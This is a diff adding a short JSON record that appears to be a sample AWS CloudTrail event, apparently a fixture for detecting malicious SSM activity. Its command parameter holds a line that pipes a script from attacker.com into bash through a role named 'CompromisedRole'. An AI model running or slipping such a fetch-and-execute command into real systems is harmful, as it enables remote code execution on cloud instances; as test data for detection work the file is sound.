@@ -1,0 +1,23 @@
+{
+  "eventVersion": "1.08",
+  "userIdentity": {
+    "type": "AssumedRole",
+    "arn": "arn:aws:sts::123456789012:assumed-role/CompromisedRole/session"
+  },
+  "eventTime": "2024-04-10T12:20:15Z",
+  "eventSource": "ssm.amazonaws.com",
+  "eventName": "SendCommand",
+  "awsRegion": "us-east-1",
+  "sourceIPAddress": "203.0.113.50",
+  "requestParameters": {
+    "documentName": "AWS-RunShellScript",
+    "instanceIds": [
+      "i-0abc123def456"
+    ],
+    "parameters": {
+      "commands": [
+        "curl http://attacker.com/payload.sh | bash"
+      ]
+    }
+  }
+}
